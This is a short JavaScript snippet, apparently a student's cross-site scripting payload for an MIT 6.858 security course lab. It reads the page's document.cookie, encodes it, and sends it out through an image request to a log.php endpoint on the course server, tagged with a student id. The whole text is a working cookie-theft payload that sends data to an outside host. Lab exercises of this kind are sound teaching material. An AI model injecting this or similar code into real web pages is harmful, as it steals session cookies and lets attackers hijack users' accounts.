var kv = 'id=friedchicken'
	+ '&payload=' + encodeURIComponent(document.cookie)
	+ '&random=' + Math.random();
var url = 'https://css.csail.mit.edu/6.858/2022/labs/log.php?' + kv;
(new Image()).src=url;
